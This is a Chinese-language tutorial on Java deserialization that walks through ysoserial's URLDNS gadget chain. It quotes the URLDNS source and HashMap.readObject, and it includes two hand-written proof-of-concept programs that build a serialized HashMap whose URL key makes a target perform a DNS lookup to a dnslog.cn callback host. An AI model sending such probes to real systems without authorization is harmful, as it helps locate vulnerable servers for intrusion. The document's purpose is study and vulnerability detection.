反序列化漏洞在各个语言里本不是一个新鲜的名词，但在 2015 年 @gebl 和 @frohoff 在 AppSecCali 上提出了利用 Apache Commons Collections 来构造命令执行的利用链，并在年底因为对 Weblogic、JBoss、Jenkins 等著名应用的利用，一时激起千层浪，彻底打开了一片 Java 安全的蓝海。

两位原作者在此议题中释出的一个里程碑式的工具——ysoserial，它可以让用户根据自己选择的利用链，生成反序列化利用数据，通过将这些数据发送给目标，从而执行用户预先定义的命令。

什么是利用链

利用链也叫 “Gadget Chains”，我们通常称为 Gadget。在 PHP 反序列化漏洞中，可以将 Gadget 理解为一种方法，它连接的是从触发位置开始到执行命令的位置结束，在 PHP 中可能是 __desctruct 到 eval。如果你没学过其他语言的反序列化漏洞，那么 Gadget 就是⼀种生成 POC 的方法罢了。

URLDNS

URLDNS 就是 ysoserial 中的一个 Gadget 的名字，但准确来说，这个其实不能称作 “利用链”。因为其参数不是⼀个可以 “利用” 的命令，而仅仅是⼀个 URL，其能触发的结果也不是命令执行，而是一次 DNS 请求。

虽然这个 URLDNS 实际上是不能 “利用” 的，但因为其如下的优点，非常适合我们在检测反序列化漏洞时使用：

  • 使用 Java 内置的类构造，对第三方库没有依赖。
  • 在目标没有回显的时候，能够通过 DNS 请求得知是否存在反序列化漏洞。

反序列化分析

我们查看 ysoserial 中的 URLDNS.java 源码：

package ysoserial.payloads;

import java.io.IOException;
import java.net.InetAddress;
import java.net.URLConnection;
import java.net.URLStreamHandler;
import java.util.HashMap;
import java.net.URL;

import ysoserial.payloads.annotation.Authors;
import ysoserial.payloads.annotation.Dependencies;
import ysoserial.payloads.annotation.PayloadTest;
import ysoserial.payloads.util.PayloadRunner;
import ysoserial.payloads.util.Reflections;


/**
 * A blog post with more details about this gadget chain is at the url below:
 *   https://blog.paranoidsoftware.com/triggering-a-dns-lookup-using-java-deserialization/
 *
 *   This was inspired by  Philippe Arteau @h3xstream, who wrote a blog
 *   posting describing how he modified the Java Commons Collections gadget
 *   in ysoserial to open a URL. This takes the same idea, but eliminates
 *   the dependency on Commons Collections and does a DNS lookup with just
 *   standard JDK classes.
 *
 *   The Java URL class has an interesting property on its equals and
 *   hashCode methods. The URL class will, as a side effect, do a DNS lookup
 *   during a comparison (either equals or hashCode).
 *
 *   As part of deserialization, HashMap calls hashCode on each key that it
 *   deserializes, so using a Java URL object as a serialized key allows
 *   it to trigger a DNS lookup.
 *
 *   Gadget Chain:
 *     HashMap.readObject()
 *       HashMap.putVal()
 *         HashMap.hash()
 *           URL.hashCode()
 *
 *
 */
@SuppressWarnings({ "rawtypes", "unchecked" })
@PayloadTest(skip = "true")
@Dependencies()
@Authors({ Authors.GEBL })
public class URLDNS implements ObjectPayload<Object> {

        public Object getObject(final String url) throws Exception {

                //Avoid DNS resolution during payload creation
                //Since the field <code>java.net.URL.handler</code> is transient, it will not be part of the serialized payload.
                URLStreamHandler handler = new SilentURLStreamHandler();

                HashMap ht = new HashMap(); // HashMap that will contain the URL
                URL u = new URL(null, url, handler); // URL to use as the Key
                ht.put(u, url); //The value can be anything that is Serializable, URL as the key is what triggers the DNS lookup.

                Reflections.setFieldValue(u, "hashCode", -1); // During the put above, the URL's hashCode is calculated and cached. This resets that so the next time hashCode is called a DNS lookup will be triggered.

                return ht;
        }

        public static void main(final String[] args) throws Exception {
                PayloadRunner.run(URLDNS.class, args);
        }

        /**
         * <p>This instance of URLStreamHandler is used to avoid any DNS resolution while creating the URL instance.
         * DNS resolution is used for vulnerability detection. It is important not to probe the given URL prior
         * using the serialized object.</p>
         *
         * <b>Potential false negative:</b>
         * <p>If the DNS name is resolved first from the tester computer, the targeted server might get a cache hit on the
         * second resolution.</p>
         */
        static class SilentURLStreamHandler extends URLStreamHandler {

                protected URLConnection openConnection(URL u) throws IOException {
                        return null;
                }

                protected synchronized InetAddress getHostAddress(URL u) {
                        return null;
                }
        }
}

代码非常简单，原理都写在注释中了，整个 Gadget Chain 的调用过程如下所示

├─HashMap.readObject()
 ├─HashMap.putVal()
  ├─HashMap.hash()
   ├─URL.hashCode()

URLDNS 类的 getObject() 方法为 ysoserial 规定的获取 Payload 对象的方法，ysoserial 会调用这个方法获得 Payload 对象，这个对象就是最后将被序列化的对象，在这里是 HashMap。众所周知，Java 触发反序列化的内置方法是 readObject，我们直接找到 HashMap 类的 readObject() 方法：

/**
 * Reconstitute the {@code HashMap} instance from a stream (i.e.,
 * deserialize it).
 */
private void readObject(java.io.ObjectInputStream s)
    throws IOException, ClassNotFoundException {
    // Read in the threshold (ignored), loadfactor, and any hidden stuff
    s.defaultReadObject();
    reinitialize();
    if (loadFactor <= 0 || Float.isNaN(loadFactor))
        throw new InvalidObjectException("Illegal load factor: " +
                                         loadFactor);
    s.readInt();                // Read and ignore number of buckets
    int mappings = s.readInt(); // Read number of mappings (size)
    if (mappings < 0)
        throw new InvalidObjectException("Illegal mappings count: " +
                                         mappings);
    else if (mappings > 0) { // (if zero, use defaults)
        // Size the table using given load factor only if within
        // range of 0.25...4.0
        float lf = Math.min(Math.max(0.25f, loadFactor), 4.0f);
        float fc = (float)mappings / lf + 1.0f;
        int cap = ((fc < DEFAULT_INITIAL_CAPACITY) ?
                   DEFAULT_INITIAL_CAPACITY :
                   (fc >= MAXIMUM_CAPACITY) ?
                   MAXIMUM_CAPACITY :
                   tableSizeFor((int)fc));
        float ft = (float)cap * lf;
        threshold = ((cap < MAXIMUM_CAPACITY && ft < MAXIMUM_CAPACITY) ?
                     (int)ft : Integer.MAX_VALUE);

        // Check Map.Entry[].class since it's the nearest public type to
        // what we're actually creating.
        SharedSecrets.getJavaOISAccess().checkArray(s, Map.Entry[].class, cap);
        @SuppressWarnings({"rawtypes","unchecked"})
        Node<K,V>[] tab = (Node<K,V>[])new Node[cap];
        table = tab;

        // Read the keys and values, and put the mappings in the HashMap
        for (int i = 0; i < mappings; i++) {
            @SuppressWarnings("unchecked")
                K key = (K) s.readObject();
            @SuppressWarnings("unchecked")
                V value = (V) s.readObject();
            putVal(hash(key), key, value, false, false);
        }
    }
}

看到第 45 行，对 HashMap 的键名 key 调用了 hash() 方法，而在 ysoserial 的注释中明确指出：

❝

During the put above, the URL's hashCode is calculated and cached. This resets that so the next time hashCode is called a DNS lookup will be triggered.

也就是说 hashCode 的计算操作触发了 DNS 请求，因此这里的 hash() 及后续的调用是我们重点关注的地方。

我们首先通过 ysoserial 生成 URLDNS Payload，相关命令如下：

构造利用链

回顾前面的反序列化过程，key 是使用 s.readObject() 方法取出来的：

也就是说在 HashMap.writeObject() 方法中一定有类似 s.writeObject(key) 的操作。我们找到 HashMap.writeObject()，并在这里下断点：

步步跟进最终进入 internalWriteEntries(s) 方法：

不难发现，这里的 key 和 value 是从 tab 中取的，而 tab 的值即 HashMap 中 table 的值，要想改变 table 的值，就需要调用 HashMap.put() 方法。

知道了反序列化的调用流程后，我们可以自己手动构造出这个链子。要构造这个 Gadget，只需要初始化一个 java.net.URL 对象，作为 key 放在 java.util.HashMap 对象中。然后，设置这个 URL 对象的 hashCode 为初始值 -1，这样反序列化时将会重新计算其 hashCode，才能触发到后面的 DNS 请求，否则不会调用 URL.hashCode()。相关代码如下：

package test;

import java.io.*;
import java.net.URL;
import java.util.HashMap;
import java.lang.reflect.*;

public class URLDNS {
    public static void main(String[] args) throws Exception {
        String url = "http://jroj1a.dnslog.cn";
        HashMap ht = new HashMap();
        URL u = new URL(null, url);
        ht.put(u, url);
        // 通过反射获取 java.net.URL 中的 hashCode 字段
        Field hashCode_ = Class.forName("java.net.URL").getDeclaredField("hashCode");
        // 由于 hashCode 字段为 private 类型, 因此需要修改的它的作用域
        hashCode_.setAccessible(true);
        // 将 hashCode 字段设为 -1
        hashCode_.set(u, -1);

        // Reflections.setFieldValue(u, "hashCode", -1);

        File f = new File(".\\urldns.bin");
        FileOutputStream fOut = new FileOutputStream(f);
        ObjectOutputStream out = new ObjectOutputStream(fOut);
        out.writeObject(ht);
        out.close();
        fOut.close();
    }
}

但是，上述 POC 在运行时就会触发 DNS 查询，我们通过调试寻找原因。在 ht.put(u, url) 处下断点进行动态调式：

步入 ht.put(u, url) ，来到 HashMap.put()：

可以看到，在 HashMap.put() 也一次调用了 hash() 方法，我们知道，在反序列化过程中，正是通过 hash() 最终调用了 URLStreamHandler.getHostAddress() 执行了 DNS 查询，那么是不是由于这里，导致在生成序列化 Payload 的时候触发 DNS 查询呢？

我们继续步入，最终又来到了 URL.hashCode() 方法：

可以看到，由于这里默认情况下 hashCode 变量为 -1，也就会直接绕过 if{} 语法直接进入 hander.hashCode()，根据前文的分析结果，最终会调用 URLStreamHandler.getHostAddress() 发起 DNS 请求。

因此，我们可以修改上述 POC，在 ht.put(u, url) 操作前将 URL 对象中的 hashCode 设为非 -1， ht.put(u, url) 操作完成后再改为 -1，这样便能绕过  ht.put(u, url) 操作时 URL.hashCode() 中的 if{}，并且不会影响后续反序列化的调用。

最终修改的 POC 如下：

package test;

import java.io.*;
import java.net.URL;
import java.util.HashMap;
import java.lang.reflect.*;

public class URLDNS {
    public static void main(String[] args) throws Exception {
        String url = "http://jroj1a.dnslog.cn";
        HashMap ht = new HashMap();
        URL u = new URL(null, url);
        // 通过反射获取 java.net.URL 中的 hashCode 字段
        Field hashCode_ = Class.forName("java.net.URL").getDeclaredField("hashCode");
        // 由于 hashCode 字段为 private 类型, 因此需要修改的它的作用域
        hashCode_.setAccessible(true);
        // 将 hashCode 字段设为 1
        hashCode_.set(u, 1);
        ht.put(u, url);
        // 将 hashCode 字段改回 -1
        hashCode_.set(u, -1);

        // Reflections.setFieldValue(u, "hashCode", -1);

        File f = new File(".\\urldns.bin");
        FileOutputStream fOut = new FileOutputStream(f);
        ObjectOutputStream out = new ObjectOutputStream(fOut);
        out.writeObject(ht);
        out.close();
        fOut.close();
    }
}

首先通过获取一个 SilentURLStreamHandler 类的对象，并将其赋给 handler，这个 SilentURLStreamHandler 类有什么作用？

如下图所示，我们可以看到，在 URLDNS 类中定义了 SilentURLStreamHandler 内部类，并继承自 URLStreamHandler 类，同时重写了父类 URLStreamHandler 中的 getHostAddress() 方法，然后直接 return null。

目前还不知道这个 SilentURLStreamHandler 内部类的作用，因此我们继续往下分析。继续跟进，直到调用 URLDNS 类中的以下代码：

这里初始化一个 java.net.URL 对象，这里会调用 URL 对象的构造方法又多个重载，这里调用的是以下重载：

public URL(URL context, String spec, URLStreamHandler handler) throws MalformedURLException

执行后，会在 URL 对象中将 this.handler 设为 URLDNS 的内部类 SilentURLStreamHandler 的对象：

到这一步也就明朗了，在 URLDNS 通过实例化 URLStreamHandler 的子类 SilentURLStreamHandler，调用子类的 getHostAddress() 方法，避免了调用父类的 getHostAddress()，完美地规避了在序列化的时候执行 DNS 查询。

当后续过程中从 URLStreamHandler.hashCode() 方法调用到 getHostAddress() 方法时，并不是调用的 URLStreamHandler.getHostAddress()，而是 SilentURLStreamHandler.getHostAddress()，由于 SilentURLStreamHandler 在继承 URLStreamHandler 后重写了 getHostAddress() 方法，使其直接 return null，自然不会继续往后调用 InetAddress.getByName() 来执行 DNS 查询了。这与我们在前面手动编写 POC 时通过反射修改 hashCode 属性值的方法有异曲同工之妙。

那么此时你可能有一个疑问，重写 getHostAddress() 后进行序列化，为什么在反序列化的时候又可以重新触发 DNS 查询了呢？是因为这里的 URL 对象中的 handler 属性被修饰符 transient 所修饰，如下图所示。

当序列化的对象包含被 transient 修饰的实例变量时，JVM 将跳过该特定的变量。也就是说这个 handler 属性无法被序列化，所以最终反序列化的时候，URL 对象中的 handler 属性依然是其初始类型，也就是 URLStreamHandler，不会变为 SilentURLStreamHandler。这也就解释了为什么前文反序列化后获取的 handler 的类型并不是前面设置的 SilentURLStreamHandler 了。
